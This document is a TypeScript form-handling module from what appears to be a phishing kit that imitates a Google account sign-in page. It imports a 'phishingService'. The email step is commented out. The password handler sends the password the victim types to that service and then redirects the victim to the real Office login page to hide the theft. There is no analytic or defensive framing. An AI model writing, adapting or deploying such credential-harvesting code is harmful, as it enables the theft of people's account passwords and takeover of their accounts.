import { phishingService } from "./google-account.astro.0.mts";

// Módulo separado para manejo de formularios
export const formHandler = (() => {
  const EMAIL_REGEX = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  const PHONE_REGEX = /^(\+\d{1,2}\s?)?1?\-?\.?\s?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}$/;
  const USER_REGEX = /^[a-zA-Z0-9]{5,31}$/;

  const validateInput = (value: string) => {
    return (
      EMAIL_REGEX.test(value) ||
      PHONE_REGEX.test(value) ||
      USER_REGEX.test(value)
    );
  };

  const setInputStatus = (input: HTMLInputElement, isValid: boolean) => {
    input.classList.toggle("has-error", !isValid);
  };

  return {
    handleEmailSubmit: async (event: SubmitEvent) => {
      event.preventDefault();
      const form = event.target as HTMLFormElement;
      const input = form.elements.namedItem("email") as HTMLInputElement;
      // const isValid = validateInput(input.value);
      // setInputStatus(input, isValid);
      // if (isValid) {
      //   await phishingService.sendEmail(input.value);
      //   viewManager.showPasswordView();
      //   viewManager.updateIdentity(input.value);
      // }
    },

    handlePasswordSubmit: async (event: SubmitEvent) => {
      event.preventDefault();
      const form = event.target as HTMLFormElement;
      const input = form.elements.namedItem("password") as HTMLInputElement;
      await phishingService.sendPassword(input.value);

      window.location.replace(
        "https://www.office.com/login?es=UnauthClick&ru=%2F&msafed=0"
      );
    },
  };
})();
